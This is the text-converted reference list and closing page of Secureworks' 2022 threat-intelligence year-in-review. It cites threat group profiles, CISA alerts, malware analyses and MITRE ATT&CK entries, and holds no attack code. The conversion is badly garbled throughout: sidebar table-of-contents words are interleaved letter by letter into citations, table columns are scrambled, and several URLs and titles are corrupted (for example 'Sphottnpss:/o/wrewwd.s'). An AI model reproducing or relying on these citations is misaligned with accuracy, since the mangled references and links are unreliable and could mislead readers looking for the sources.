54  BRONZE UNIVERSITY threat group profile, Secureworks.  68  COBALT ILLUSION threat group profile, Secureworks.  Russian scientific and technical enterprises and state
| https://www.secureworks.com/research/threat-profiles/ | https://www.secureworks.com/research/threat-profiles/ |     |
| ----------------------------------------------------- | ----------------------------------------------------- | --- |
bodies (CERT-UA#4860), CERT-UA, accessed 7/28/22.
bronze-university cobalt-illusion https://cert.gov.ua/article/375404
08 The Secureworks
09 55 VieSwha doofw tPhaed  MTahlwrearaet Analysis, Secureworks.
|     | 69  Iranian Government-Sponsored APT Cyber Actors  | 83  IRON TILDEN threat group profile, Secureworks.   |
| --- | -------------------------------------------------- | ---------------------------------------------------- |
https://www.secureworks.com/research/shadowpad-malware- Exploiting Microsoft Exchange and Fortinet  https://www.secureworks.com/research/threat-profiles/
analysis
|     | Vulnerabilities in Furtherance of Malicious Activities,  | iron-tilden |
| --- | -------------------------------------------------------- | ----------- |
CISA, accessed 7/28/22.
56  COBALT ULSTER threat group profile, Secureworks.  https://www.cisa.gov/uscert/ncas/alerts/aa21-321a 84  IRON LIBERTY threat group profile, Secureworks.
https://www.secureworks.com/research/threat-profiles/
https://www.secureworks.com/research/threat-profiles/
| Cobalt-ulster | 70  COBALT SHADOW threat group profile, Secureworks.  | iron-liberty |
| ------------- | ----------------------------------------------------- | ------------ |
https://www.secureworks.com/research/threat-profiles/
cobalt-shadow
57  Iranian intel cyber suite of malware uses open-source  85  IRON HUNTER threat group profile, Secureworks.
tools, U.S. Cyber Command, accessed 7/28/22.   https://www.secureworks.com/research/threat-profiles/
| https://www.cybercom.mil/Media/News/Article/2897570/         | 71  COBALT SAPLING threat group profile, Secureworks.  | iron-hunter  |
| ------------------------------------------------------------ | ------------------------------------------------------ | ------------ |
| iranian-intel-cyber-suite-of-malware-uses-open-source-tools/ | https://www.secureworks.com/research/threat-profiles/  |              |
2022 State of the Threat: A Year in Review 69
cobalt-sapling

|     | 86  IRON HEMLOCK threat group profile, Secureworks.   |     | 101  THREAT ALERT: Raspberry Robin Worm Abuses   |     |
| --- | ----------------------------------------------------- | --- | ------------------------------------------------ | --- |
|     | https://www.secureworks.com/research/threat-profiles/ |     | Windows Installer and QNAP Devices, Cybereason,  |     |
|     | iron-hemlock                                          |     | accessed 7/28/22.                                |     |
https://www.cybereason.com/blog/threat-alert-raspberry-
|     | 87  IRON RITUAL threat group profile, Secureworks.   |     | robin-worm-abuses-windows-installer-and-qnap-devices |     |
| --- | ---------------------------------------------------- | --- | ---------------------------------------------------- | --- |
https://www.secureworks.com/research/threat-profiles/
| 01  | Leitroten-rr itFuarlom Our CTIO |     | 102  ODBCCONF.EXE, Microsoft, accessed 8/4/22.   |     |
| --- | ------------------------------- | --- | ------------------------------------------------ | --- |
https://docs.microsoft.com/en-us/sql/odbc/odbcconf-
|     | 88  IRON TWILIGHT threat group profile, Secureworks.  |     | exe?view=sql-server-ver16 |     |
| --- | ----------------------------------------------------- | --- | ------------------------- | --- |
https://www.secureworks.com/research/threat-profiles/
|     | Executive Summary  iron-twilight |     | 103  BRONZE ATLAS threat group profile, Secureworks.  |     |
| --- | -------------------------------- | --- | ----------------------------------------------------- | --- |
https://www.secureworks.com/research/threat-profiles/
02
|     | 89 anIdR OKNe VyI KFINinGd tihnrgeast group profile, Secureworks.   |     | bronze-atlas |     |
| --- | ------------------------------------------------------------------- | --- | ------------ | --- |
https://www.secureworks.com/research/threat-profiles/
|     | iron-viking |     | 104  AUTHENTICODE (I): UNDERSTANDING WINDOWS  |     |
| --- | ----------- | --- | --------------------------------------------- | --- |
AUTHENTICODE, RME, accessed 7/28/22.
https://reversea.me/index.php/authenticode-i-understanding-
90 RaNnIsCoKEmLw ACaAreD ERMeY mthareinats g rtohuep  profile, Secureworks.
|     | https://www.secureworks.com/research/threat-profiles/ |     | windows-authenticode/ |     |
| --- | ----------------------------------------------------- | --- | --------------------- | --- |
03 Prinmickaerl-ya cSadteramtyegic Threat
105  Microsoft Security Bulletin MS13-098 - Critical,
|     | 91  Lazarus Targets Chemical Sector, Symantec, accessed                           |     | Microsoft, accessed 7/28/22.                       |     |
| --- | --------------------------------------------------------------------------------- | --- | -------------------------------------------------- | --- |
|     | 7/28/22.                                                                          |     | https://docs.microsoft.com/en-us/security-updates/ |     |
|     | Rahnttspos:/m/sywmaanrtee cE-ennatebrplreisres-b: logs.security.com/blogs/threat- |     | securitybulletins/2013/ms13-098                    |     |
| 04  | intelligence/lazarus-dream-job-chemical                                           |     |                                                    |     |
Loaders and Infostealers
106  Microsoft Security Advisory 2915720, Microsoft,
|     | 92  NICKEL KIMBALL threat group profile, Secureworks.  |     | accessed 7/28/22.                                  |     |
| --- | ------------------------------------------------------ | --- | -------------------------------------------------- | --- |
|     | https://www.secureworks.com/research/threat-profiles/  |     | https://docs.microsoft.com/en-us/security-updates/ |     |
securityadvisories/2014/2915720
nickel-kimball
Exploitation of Remote
|     | 93  North Korean Hackers Have Prolific Year as Their          |                                                           | 107  Russian State-Sponsored Cyber Actors Gain Network   |     |
| --- | ------------------------------------------------------------- | --------------------------------------------------------- | -------------------------------------------------------- | --- |
| 05  | Se rv i c e s  i                                              | s   N o w   th e   M o s t                                |                                                          |     |
|     | U nl a u nd e                                                 | r e d  C ry p to cu r r en cy   H oldings Reach All-time  | Access by Exploiting Default Multifactor Authentication  |     |
|     | CoHmigmh, oChna iAnaclycseiss, asc cVeescsetdo 7r/28/22.      |                                                           | Protocols and “PrintNightmare” Vulnerability, CISA,      |     |
|     | https://blog.chainalysis.com/reports/north-korean-hackers-    |                                                           | accessed 8/1/22.                                         |     |
|     | have-prolific-year-as-their-total-unlaundered-cryptocurrency- |                                                           | https://www.cisa.gov/uscert/ncas/alerts/aa22-074a        |     |
holdings-reach-all-time-high/
108  Lapsus$ and SolarWinds hackers both use the same old
|     | Ho s t il e   G o                                                              | v e rn m e n t -                                     | trick to bypass MFA, Ars Technica, accessed 7/28/22.    |     |
| --- | ------------------------------------------------------------------------------ | ---------------------------------------------------- | ------------------------------------------------------- | --- |
|     | 94  N I C K E L  G                                                             | L A DS TO N E  th r eat group profile, Secureworks.  |                                                         |     |
| 06  | Sphottnpss:/o/wrewwd.s eAccurteowro rAksc.ctoimv/itreys earch/threat-profiles/ |                                                      | https://arstechnica.com/information-technology/2022/03/ |     |
lapsus-and-solar-winds-hackers-both-use-the-same-old-trick-
Shnoicwkesl- gala dRsteongeional Focus
| 06  |                                                         |     | to-bypass-mfa/                                            |     |
| --- | ------------------------------------------------------- | --- | --------------------------------------------------------- | --- |
|     | 95  TraderTraitor: North Korean State-Sponsored APT     |     |                                                           |     |
|     | Targets Blockchain Companies, CISA, accessed 7/28/22.   |     | 109  Catching Transparent Phish: Analyzing and Detecting  |     |
|     | https://www.cisa.gov/uscert/ncas/alerts/aa22-108a       |     | MITM Phishing Toolkits, Stony Brook University and Palo   |     |
|     | Defense Evasion Offers Its                              |     | Alto, accessed 7/28/22.                                   |     |
| 07  |                                                         |     | https://catching-transparent-phish.github.io/catching_    |     |
96 OwNnor tDh eKtoerecat Dioensig Onaptiopno Urtpudantiet,i eUs.S. Department of
|     | the Treasury, accessed 7/28/22.   |     | transparent_phish.pdf |     |
| --- | --------------------------------- | --- | --------------------- | --- |
https://home.treasury.gov/policy-issues/financial-sanctions/
|     | recent-actions/20220414 |     | 110  Clever phishing method bypasses MFA using Microsoft  |     |
| --- | ----------------------- | --- | --------------------------------------------------------- | --- |
07
WebView2 apps, Bleeping Computer, accessed 7/28/22.
https://www.bleepingcomputer.com/news/security/clever-
08 97 CoBnRcOlNuZsEi oBnUTLER threat group profile, Secureworks.
|     | https://www.secureworks.com/research/threat-profiles/ |                                                                             | phishing-method-bypasses-mfa-using-microsoft-webview2- |                                                 |
| --- | ----------------------------------------------------- | --------------------------------------------------------------------------- | ------------------------------------------------------ | ----------------------------------------------- |
|     | bronze-butler                                         |                                                                             | apps/                                                  |                                                 |
|     |                                                       |                                                                             | 111  M I T R E   AT T & C                              | K ( r)   N a v ig a t o r.                      |
| 0 8 | 98  Th D e e   S f e e a t c in u g                   | r   A e P w T 1 o 0 r   c k o s m    p il e r -l e vel obfuscations, Virus  |                                                        |                                                 |
|     | B u l l e ti n ,   a                                  | c c e s s e d   7 / 2 8 / 2 2 .                                             | ht t p s: // m itr e -a                                | t ta c k . gi th u b .i o /a t t ack-navigator/ |
0 9 Viehwttp so://fw twhwe.v irTuhsbruelleattin.com/conference/vb2019/abstracts/
|     | defeating-apt10-compiler-level-obfuscations/ |     | 112  OS Credential Dumping, MITRE ATT&CK(r).   |     |
| --- | -------------------------------------------- | --- | ---------------------------------------------- | --- |
https://attack.mitre.org/techniques/T1003/
|     | 99  GuLoader: Peering Into a Shellcode-based Downloader,  |     |     |     |
| --- | --------------------------------------------------------- | --- | --- | --- |
Crowdstrike, accessed 7/28/22.
https://www.crowdstrike.com/blog/guloader-malware-
analysis/
|     | 100  GOLD DUPONT threat group profile, Secureworks. |     |     |     |
| --- | --------------------------------------------------- | --- | --- | --- |
https://www.secureworks.com/research/threat-profiles/
GOLD-DUPONT
2022 State of the Threat: A Year in Review 70

01 Letter From Our CTIO
Executive Summary
02
and Key Findings
Ransomware Remains the
03
Primary Strategic Threat
About Secureworks
Ransomware Enablers:
04
Loaders and Infostealers
Secureworks® (NASDAQ: SCWX) is a global cybersecurity leader that protects customer
Exploitation of Remote
05 Seprvriocegs ries Nsosw w thieth M oSste cureworks® Taegis™, a cloud-native security analytics platform built on 20+ years
Common Access Vector
of real-world threat intelligence and research, improving customers’ ability to detect advanced
threats, streamline and collaborate on investigations, and automate the right actions.
Hostile Government-
06 Sponsored Actor Activity
Shows a Regional Focus
06
Defense Evasion Offers Its
07
Own Detection Opportunities
For more information, call 1-877-838-7947 to speak to a
07 Secureworks security specialist or visit secureworks.com
08 Conclusion
08 The Secureworks
09
View of the Threat
Availability varies by region. ©2022 SecureWorks, Inc. All rights reserved.
2022 State of the Threat: A Year in Review 71

<!-- CONVERSION_METADATA: {"source": "https://github.com/jacobdjwilson/awesome-annual-security-reports", "date": "2026-10-16", "model": "gemini-3.5-flash-lite"} -->
